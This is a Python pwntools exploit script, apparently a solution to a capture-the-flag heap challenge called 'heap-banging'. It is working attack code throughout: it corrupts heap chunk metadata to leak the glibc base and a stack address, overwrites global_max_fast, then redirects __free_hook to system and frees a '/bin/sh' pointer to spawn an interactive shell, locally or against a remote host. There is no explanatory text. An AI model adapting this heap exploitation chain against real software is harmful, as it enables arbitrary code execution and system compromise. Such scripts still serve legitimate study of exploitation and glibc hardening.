#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, sys, u64


context.binary = 'heap-banging'
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port, ssl=True)


def create():
    io.sendlineafter(b'>> ', b'1')


def read(index: int) -> bytes:
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'Choose riff: ', str(index).encode())
    io.recvuntil(b'Song lyrics: ')
    return io.recv(0x78)


def update(index: int, data: bytes):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'Choose song to play: ', str(index).encode())
    io.sendafter(b'Sing along: ', data)


def delete(index: int):
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b'Choose song to forget: ', str(index).encode())


io = get_process()

for _ in range(11):
    create()

for i in range(3, 10):
    delete(i)

update(0, b'\0' * 0x78 + b'\x81\x04')
delete(1)

create()  # 11

glibc.address = u64(read(2)[:8]) - 0x1ecbe0
io.success(f'Glibc base address: {hex(glibc.address)}')

create()  # 12
delete(2)

for i in range(15):
    update(12, p64(((glibc.address + 0x1eeea0) - 8) + 0x80 * i))  # global_max_fast
    create()  # 13 + 2 * i
    create()  # 14 + 2 * i

    if i < 14:
        update(14 + 2 * i, b'\0' * 0x78 + b'\x82')
        delete(13 + 2 * i)

stack_addr = u64(read(14 + 2 * i)[88:96]) - 0x330
io.success(f'Stack address: {hex(stack_addr)}')

delete(13 + 2 * i)
i += 1

update(12, p64((stack_addr + 0xc) - 8))
create()  # 13 + 2 * i
delete(0x82)
create()  # 14 + 2 * i

update(14 + 2 * i, b'\0' * 4 + p64(glibc.sym.__free_hook) + p64(next(glibc.search(b'/bin/sh'))))
update(1, p64(glibc.sym.system))
delete(2)

io.interactive()
